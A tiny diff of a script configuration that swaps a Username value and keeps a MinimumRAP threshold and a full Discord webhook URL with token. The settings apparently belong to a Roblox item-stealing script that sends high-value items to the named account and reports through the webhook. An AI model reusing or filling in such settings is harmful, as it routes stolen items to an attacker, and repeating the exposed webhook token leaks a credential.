@@ -1,5 +1,5 @@
-Username = "agusmar"
-Username2 = "agusmar"
+Username = "rayqne_7654"
+Username2 = "rayqne_7654"
 MinimumRAP = 75000
 Webhook = "https://discord.com/api/webhooks/1341733574524796968/JsycflB2_RpKiyp7iHQNr-_xVOfzeBosD3H511W1EUH3gxxzO4U48wIEtw7ApNoYDy4y"
 
